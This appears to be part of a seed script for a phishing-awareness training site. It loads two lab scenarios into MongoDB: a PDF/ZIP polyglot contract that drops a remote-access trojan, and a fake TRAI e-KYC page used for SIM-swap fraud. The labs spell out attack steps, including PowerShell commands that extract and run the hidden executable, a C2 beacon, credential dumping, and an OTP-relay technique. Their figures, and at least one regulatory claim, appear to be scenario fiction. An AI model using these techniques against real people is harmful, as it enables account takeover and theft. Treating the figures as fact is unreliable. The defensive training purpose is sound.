        'A digitally signed PDF contract sent via DocuSign to a FinTrust Corp procurement officer contains an embedded QR code in the "additional terms" appendix. The PDF is simultaneously a valid PDF and a ZIP file (PDF polyglot) — unzipping it reveals a malware executable. Scanning the QR decryption instructions triggers a Chain of actions: QR → download URL → PowerShell → malware extraction from the PDF itself.',
        {
            type: 'pdf_polyglot_with_embedded_qr',
            deliveryChannel: 'DocuSign-wrapped PDF — digital signature present from "LegalDocs-Sign[.]com"',
            signingCertificate: 'Self-signed certificate: "LegalDocs Signing Authority" — NOT a trusted CA',
            targetUser: 'FinTrust Corp procurement officer — received as "Vendor Contract Amendment"',
            pdfAppearance: 'Professional 47-page vendor contract — QR in footer of Appendix C (page 44)',
        },
        {
            decoded: 'https://contract-decrypt-tool[.]com/verify?doc=HASH&key=BASE64KEY',
            format: 'URL — "document decryption verification" portal',
            polyglotMechanism: 'PDF byte structure ends with valid EOCD (End of Central Directory) — file is simultaneously valid PDF and ZIP',
            zipContent: 'Nested inside PDF ZIP: ContractDecryptTool.exe (malware — RAT payload)',
            attackChain: 'QR → download PowerShell script → script extracts .exe from the PDF file itself → execute RAT',
            deliveryMethod: 'DocuSign email → PDF attachment — trusted document workflow',
        },
        {
            attackChainDetailed: [
                'PowerShell script downloaded from contract-decrypt-tool.com',
                'Script: Rename-Item contract.pdf contract.zip; Expand-Archive contract.zip $env:TEMP\\decrypt\\',
                'Extract: ContractDecryptTool.exe from ZIP contents within the PDF',
                'Execute: Start-Process $env:TEMP\\decrypt\\ContractDecryptTool.exe',
                'RAT establishes persistence via Run registry key + C2 beacon to 185.234.XX.XX',
            ],
            ratCapabilities: 'Remote shell, keylogging, credential dumping via Mimikatz module, screenshot capture',
            fileProperties: {
                pdfSize: '3.8 MB',
                zipContent: 'ContractDecryptTool.exe — 2.1 MB RAT payload',
                virusTotalDetection: '4/68 — novel packer + polyglot structure confuses AV engines',
            },
        },
        [
            'PDF polyglot: valid PDF AND valid ZIP — tools expect one format and succeed; dual-format confuses AV',
            'DocuSign delivery: trusted email sender + signed document workflow = low suspicion',
            'Self-signed certificate on DocuSign document — "LegalDocs Signing Authority" not in trusted root store',
            'PowerShell: renames PDF → ZIP → extracts EXE from within the PDF file byte structure',
            'VT detection: 4/68 — polyglot + novel packer defeats most AV signatures',
            'Appendix C QR: 44 pages deep — recipient less likely to scrutinize appendix footer',
        ],
        [
            'Explain the PDF polyglot technique at a byte-structure level — what makes a single file simultaneously a valid PDF and a valid ZIP, and why does this confuse AV engines and mail filters?',
            'The PowerShell command renames contract.pdf to contract.zip and extracts its contents. This is the critical step that reveals the hidden executable. What endpoint control would detect and block this specific PowerShell behavior?',
            'The signing certificate is from "LegalDocs Signing Authority" — not a trusted CA. How would a procurement officer verify a document\'s signing certificate, and what visual indicator in Adobe Acrobat would show the self-signed status?',
            'The malware was 4/68 detected on VirusTotal at delivery time. What detection method would have identified the threat that signature-based AV missed?',
        ],
        'PDF Polyglot Byte Structure: A PDF file begins with "%PDF-1.x" header and ends with "%%EOF" marker. A ZIP file begins with "PK\x03\x04" local file header. PDF readers parse from the beginning (PDF header → content → %%EOF). ZIP readers parse from the END (EOCD → central directory → local files). A polyglot is crafted by structuring the file as: [PDF content][ZIP data containing EXE][EOCD]. PDF readers see valid PDF (stop at %%EOF before ZIP section). ZIP tools find valid EOCD at file end and read backward to extract ZIP contents. AV tools apply either PDF parser or ZIP parser — not both simultaneously — missing the malicious ZIP payload.',
        'phishing',
        'VERDICT: PDF Polyglot QR Attack — RAT Delivered via DocuSign-Wrapped Dual-Format File. Risk: CRITICAL.\n\nTrusted Delivery: DocuSign workflow + professional contract framing = highest document trust context.\n\nRAT: Full remote shell + credential dumping. Lateral movement expected from procurement device (access to vendor systems, financial systems, email).\n\nRemediation: Isolate device. Mimikatz credential dump means ALL passwords typed since infection must be rotated. Deploy Sysmon rule: Alert on rename + archive expansion of any .pdf file to extract .exe. Block contract-decrypt-tool.com.'
    ),

    mkLab(
        'QR Advanced - SIM Swap Enablement via QR-Based Fake e-KYC',
        7,
        'Victims receive an official-looking SMS from "TRAI" stating their SIM card will be deactivated unless e-KYC is completed. The SMS contains a QR code. Scanning initiates a fake e-KYC flow collecting Aadhaar, OTP, selfie, and mobile number. This data is used to submit fraudulent SIM swap requests to the telecom carrier — transferring the victim\'s mobile number to an attacker-controlled SIM.',
        {
            type: 'sms_with_qr_link',
            spoofedSender: 'TRAI-KYC (SMS sender ID spoofed)',
            smsText: 'URGENT: Your SIM card will be deactivated in 24 hours due to pending e-KYC. Complete verification immediately: [QR CODE IMAGE]',
            targetData: 'Active mobile number holders — campaign targeted 50,000+ numbers via SMS blast',
            successfulSwaps: '847 SIM swaps executed before telecom carrier detected pattern',
        },
        {
            decoded: 'https://trai-ekyc-verify[.]in/start',
            format: 'URL — fake e-KYC portal',
            deliveryMethod: 'SMS blast — spoofed TRAI sender ID',
            legitimateContext: 'Real telecom e-KYC processes exist — attacker leverages real regulatory context',
        },
        {
            eKYCFlow: [
                'Step 1: Enter mobile number + carrier selection',
                'Step 2: Enter Aadhaar number + date of birth',
                'Step 3: "OTP sent to Aadhaar-linked mobile" — victim enters Aadhaar OTP (real UIDAI OTP flow manipulated)',
                'Step 4: Liveness check — selfie capture via browser camera API',
                'Step 5: "KYC submitted — SIM will remain active" — confirmation page',
                'Backend: Attacker submits SIM swap request to carrier with harvested Aadhaar + OTP + selfie',
            ],
            simSwapOutcome: [
                'Victim\'s number transferred to attacker SIM within 2-4 hours',
                'All OTPs (banking, email, WhatsApp) now delivered to attacker SIM',
                'Victim\'s phone: "No network" — SIM deactivated (shows as signal lost)',
                'Attacker: Uses number to reset banking passwords → initiates fund transfers',
            ],
            totalLoss: '847 SIM swaps → avg banking loss ₹2.3L per victim = ₹19.48 crore estimated total',
        },
        [
            'TRAI sender ID spoofed — real TRAI uses registered sender IDs but spoofing is trivial with SMS aggregators',
            'Aadhaar OTP: attacker used UIDAI API to trigger OTP to victim\'s real phone — victim enters OTP on fake site',
            'Selfie + Aadhaar + OTP = complete telecom e-KYC package — sufficient for carrier SIM swap API',
            '847 simultaneous swap requests — carrier\'s fraud detection triggered at 312 (remainder processed before detection)',
            'Victim detection: "No network" — commonly dismissed as coverage issue for 1-3 hours',
            'Banking window: 2-4 hours from SIM swap to bank reset to fund transfer',
        ],
        [
            'The attacker used the UIDAI API to trigger a real Aadhaar OTP to the victim\'s real phone. The victim then entered this OTP on the fake page — effectively self-authorizing the attacker\'s e-KYC process. Explain this OTP relay technique and why it makes the Aadhaar OTP insufficient for authorizing a SIM swap.',
            'The victim loses mobile signal after SIM swap. The 2-4 hour window before "no signal" is investigated is the attacker\'s operational window. What banking-side controls would prevent fund transfer during a SIM-swap-active period?',
            "847 SIM swaps were processed before the carrier's fraud detection triggered at swap #312. What behavioral signal should carrier fraud analytics flag to detect coordinated SIM swap campaigns?",
            'Design a telecom e-KYC flow that is resistant to this attack — what additional binding mechanism prevents fake sites from completing valid e-KYC on behalf of victims?',
        ],
        'Aadhaar OTP Relay: The attacker uses UIDAI\'s legitimate "Aadhaar OTP" API — providing the victim\'s Aadhaar number triggers a real OTP SMS to the victim\'s real phone. The victim receives a genuine OTP from UIDAI. The fake site prompts: "Enter the OTP you just received." Victim enters it, thinking they\'re completing TRAI KYC. Attacker receives the OTP and submits it to the carrier\'s SIM swap API within the 10-minute validity window. The OTP is real — the fraud is in the submission endpoint. Resistant design: Bind e-KYC to a device-specific cryptographic challenge (DPDP Act 2023 mandates DigiLocker-integrated e-KYC with device binding) — OTP alone without device-level signature is insufficient for SIM swap authorization.',
        'phishing',
        'VERDICT: SIM Swap via QR-Delivered Fake e-KYC — 847 Numbers Hijacked. ₹19.48 Crore Banking Loss Estimated.\n\nAadhaar OTP Relay: Real KYC infrastructure abused — victim self-authorizes using genuine UIDAI OTP on fake portal.\n\nBanking cascade: SIM → OTP theft → password reset → fund transfer.\n\nResponse: Alert all major banks to suspend OTP-auth on accounts flagged with recent SIM swap. CERT-In emergency advisory. Telecom carrier: SIM swap freeze for 24 hours + manual verification requirement. UIDAI: Flag compromised Aadhaar numbers.'
    ),
];

async function seed() {
    const DB = process.env.MONGODB_URI || 'mongodb://localhost:27017/antiphishx';
    await mongoose.connect(DB);
    console.log('✅ Connected to MongoDB\n');

    for (const lab of LABS) {
        await Lab.findOneAndUpdate(
            { title: lab.title },
            lab,
            { upsert: true, new: true, runValidators: false }
        );
        console.log(`  ✔ [ADV ${lab.difficulty}/10] ${lab.title}`);
    }

    const total = await Lab.countDocuments();
    console.log(`\n✅ Done — ${LABS.length} QR Code Advanced labs upserted.`);
    console.log(`   🗄️  Total labs in DB: ${total}`);
    process.exit(0);
}

seed().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
